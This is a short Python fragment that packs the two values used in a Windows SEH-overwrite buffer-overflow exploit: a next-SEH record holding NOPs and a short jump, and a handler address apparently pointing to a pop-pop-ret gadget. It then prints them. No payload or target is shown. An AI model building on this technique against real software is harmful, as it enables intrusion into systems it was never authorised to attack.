from struct import pack
nseh = pack("<L", 0x06eb9090) 
seh = pack("<L", 0x1001ae86) 
print(nseh, seh)